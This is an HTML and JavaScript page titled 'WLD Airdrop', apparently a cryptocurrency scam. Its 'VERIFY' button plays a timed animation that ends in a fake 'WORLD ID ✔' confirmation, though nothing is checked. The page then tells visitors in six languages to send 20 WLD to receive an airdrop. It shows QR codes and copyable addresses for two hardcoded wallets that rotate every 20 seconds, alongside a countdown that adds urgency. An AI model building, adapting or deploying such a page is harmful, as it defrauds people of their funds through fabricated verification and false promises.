<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WLD Airdrop</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{
  width:100%;
  height:100%;
  font-family:Inter,system-ui,sans-serif;
  background:#f2f2f2;
  overflow:hidden;
}

.center{
  height:100%;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  text-align:center;
}

/* LOGO */
.logo{
  width:90px;
  animation:spin 20s linear infinite;
}
@keyframes spin{
  from{transform:rotateY(0)}
  to{transform:rotateY(360deg)}
}

/* ROTATING TEXT */
.rotating-text{
  margin-top:22px;
  font-weight:700;
  letter-spacing:2px;
  font-size:20px;
  opacity:0;
  transition:opacity 1s ease;
}
.rotating-text.show{opacity:1}

/* VERIFY */
#widBox button{
  margin-top:26px;
  padding:14px 30px;
  border:none;
  border-radius:10px;
  background:#000;
  color:#fff;
  letter-spacing:2px;
  cursor:pointer;
}

/* SPINNER */
.spinner{
  display:none;
  margin-top:20px;
  width:40px;
  height:40px;
  border:4px solid rgba(0,200,120,.3);
  border-top:4px solid #00c389;
  border-radius:50%;
  animation:spin2 1s linear infinite;
}
@keyframes spin2{to{transform:rotate(360deg)}}

/* WORLD ID OK */
.worldid-ok{
  display:none;
  margin-top:20px;
  font-size:20px;
  font-weight:700;
  color:#00c389;
  letter-spacing:2px;
}

/* QR */
.qr-box{
  display:none;
  margin-top:26px;
}
.qr-title{
  font-size:16px;
  font-weight:700;
  letter-spacing:2px;
}
.qr-date{
  margin-top:6px;
  font-size:18px;
}
#qrCanvas{
  margin-top:12px;
  background:#fff;
  padding:12px;
  border-radius:14px;
}
.renew{
  margin-top:10px;
  font-size:12px;
  letter-spacing:2px;
  opacity:.7;
}

/* COPY */
.deposit-code{
  display:none;
  margin-top:14px;
}
.deposit-code input{
  width:320px;
  padding:10px;
  text-align:center;
}
.deposit-code button{
  margin-top:10px;
  padding:10px 22px;
  border:none;
  background:#000;
  color:#fff;
  cursor:pointer;
}
#copyMsg{
  font-size:12px;
  opacity:0;
}

/* STATUS */
.status{
  margin-top:16px;
  font-size:14px;
}
</style>
</head>

<body>

<div class="center">

  <img src="logowld.png" class="logo">

  <!-- MAIN ROTATING TEXT -->
  <div class="rotating-text" id="mainText"></div>

  <!-- VERIFY -->
  <div id="widBox">
    <button id="verifyBtn">VERIFY</button>
  </div>

  <div class="spinner" id="spinner"></div>

  <div class="worldid-ok" id="worldOk">WORLD ID ✔</div>

  <!-- QR -->
  <div class="qr-box" id="qrBox">
    <div class="rotating-text show" id="qrText"></div>
    <div class="qr-date" id="dateCountdown"></div>
    <canvas id="qrCanvas" width="160" height="160"></canvas>
    <div class="renew">renew in <span id="renewCounter">20</span>s</div>
  </div>

  <div class="deposit-code" id="depositBox">
    <input id="addr" readonly>
    <button id="copyBtn">COPY ADDRESS</button>
    <div id="copyMsg">Copied ✓</div>
  </div>

  <div class="status" id="status"></div>

</div>

<script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>

<script>
/* ========= TEXTS ========= */
const TEXTS = [
  "Send 20 WLD to receive the airdrop",
  "Envía 20 WLD para recibir el airdrop",
  "Envie 20 WLD para receber o airdrop",
  "Envoyez 20 WLD pour recevoir l’airdrop",
  "Invia 20 WLD per ricevere l’airdrop",
  "发送 20 WLD 以接收空投"
];

let textIndex = 0;
const mainText = document.getElementById("mainText");
const qrText = document.getElementById("qrText");

function startTextRotation(){
  function update(){
    mainText.classList.remove("show");
    qrText.classList.remove("show");

    setTimeout(()=>{
      mainText.innerText = TEXTS[textIndex];
      qrText.innerText = "ENVÍA PARA RECIBIR EN";
      mainText.classList.add("show");
      qrText.classList.add("show");
      textIndex = (textIndex + 1) % TEXTS.length;
    },1000);
  }
  update();
  setInterval(update,4000);
}

/* ========= DATE COUNTDOWN ========= */
const target = new Date("2026-01-11T00:00:00");
const dateEl = document.getElementById("dateCountdown");

setInterval(()=>{
  const d = target - new Date();
  if(d<=0){ dateEl.innerText="HOY"; return; }
  const days=Math.floor(d/86400000);
  dateEl.innerText = `${days} DÍAS`;
},1000);

/* ========= QR ========= */
const WALLETS=[
 "0x1f62e7890d5db2c94c280547876b050f5d1816c5",
 "0xf8af1505beb8a37207eb1f019ded31dd08fc571c"
];
let w=0;
const qr=new QRious({element:qrCanvas,size:160,value:WALLETS[0]});

/* ========= VERIFY ========= */
verifyBtn.onclick=()=>{
  widBox.style.display="none";
  spinner.style.display="block";
  setTimeout(()=>{
    spinner.style.display="none";
    worldOk.style.display="block";
    setTimeout(()=>{
      worldOk.style.display="none";
      qrBox.style.display="block";
      depositBox.style.display="block";
      startTextRotation();
      startRenew();
    },1500);
  },4000);
};

/* ========= RENEW ========= */
let renew=20,angle=0;
function startRenew(){
  setInterval(()=>{
    renew--;
    renewCounter.innerText=renew;
    if(renew===0){
      w=(w+1)%WALLETS.length;
      qr.set({value:WALLETS[w]});
      angle=(angle+90)%360;
      qrCanvas.style.transform=`rotate(${angle}deg)`;
      addr.value=WALLETS[w];
      renew=20;
    }
  },1000);
}

/* ========= COPY ========= */
copyBtn.onclick=()=>{
  navigator.clipboard.writeText(addr.value);
  copyMsg.style.opacity=1;
  setTimeout(()=>copyMsg.style.opacity=0,1500);
};
</script>

</body>
</html>
